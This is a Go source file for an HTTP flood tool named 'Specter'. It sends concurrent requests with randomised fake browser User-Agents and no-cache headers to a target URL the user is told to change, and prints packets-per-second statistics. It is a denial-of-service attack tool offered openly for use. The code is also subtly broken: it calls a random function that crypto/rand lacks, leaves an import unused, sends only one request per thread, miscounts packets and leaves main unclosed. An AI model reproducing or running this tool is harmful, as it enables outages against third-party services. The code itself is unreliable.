package main

import (
	"crypto/rand"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync"
	"time"
)

// Config holds attack parameters
type Config struct {
	URL      string
	Threads  int
	Method   string // GET, POST
	TargetIP string // Optional: for direct IP targeting if DNS fails
}

// SpecterEngine handles the concurrent attacks
type SpecterEngine struct {
	Config
	wg      sync.WaitGroup
	mu      sync.Mutex
	packets uint64
	startTime time.Time
}

func NewSpecter(cfg Config) *SpecterEngine {
	return &SpecterEngine{
		Config:    cfg,
		startTime: time.Now(),
	}
}

// generateRandomUserAgent creates a fake browser header
func generateRandomUserAgent() string {
	browsers := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
	}
	return browsers[rand.Intn(len(browsers))]
}

// sendRequest performs a single HTTP request
func (s *SpecterEngine) sendRequest() {
	defer s.wg.Done()

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	req, err := http.NewRequest(s.Method, s.Config.URL, nil)
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", generateRandomUserAgent())
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := client.Do(req)
	if resp != nil {
		io.Copy(io.Discard, resp.Body) // Drain body to reuse connection
		resp.Body.Close()
	}
	
	s.mu.Lock()
	s.packets++
	s.mu.Unlock()
}

// Start launches the flood
func (s *SpecterEngine) Start() {
	fmt.Printf("[SPECTER] Starting %d threads against %s\n", s.Threads, s.Config.URL)
	fmt.Println("[SPECTER] Press Ctrl+C to stop.")

	for i := 0; i < s.Threads; i++ {
		s.wg.Add(1)
		go s.sendRequest()
	}

	// Monitor stats every second
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		s.mu.Lock()
		count := s.packets
		s.packets = 0 // Reset counter
		s.mu.Unlock()

		duration := time.Since(s.startTime).Seconds()
		if duration > 0 {
			ppm := float64(count) / duration
			fmt.Printf("[SPECTER] Packets Sent: %d | PPS: %.2f | Total Time: %.1fs\n", 
				count + (uint64(ppm)*(uint64(duration))), ppm, duration)
		}
	}
}

func main() {
	// Default config - modify these or pass via flags
	cfg := Config{
		URL:      "http://example.com", // CHANGE THIS
		Threads:  500,                  // Adjust based on your CPU cores
		Method:   "GET",
	}

	engine := NewSpecter(cfg)
	engine.Start()

